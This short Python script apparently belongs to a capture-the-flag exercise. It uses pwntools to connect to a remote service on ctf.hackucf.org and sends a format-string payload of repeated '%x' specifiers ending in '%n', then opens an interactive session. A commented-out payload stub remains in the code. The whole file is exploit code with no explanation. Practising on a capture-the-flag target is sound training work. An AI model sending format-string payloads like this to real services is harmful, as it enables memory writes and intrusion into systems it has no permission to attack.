from pwn import *
io = remote('ctf.hackucf.org', 7006)

# payload = fit({

# })

payload = b'%x%x%x%x%x%x%n'
io.sendline(payload)
io.interactive()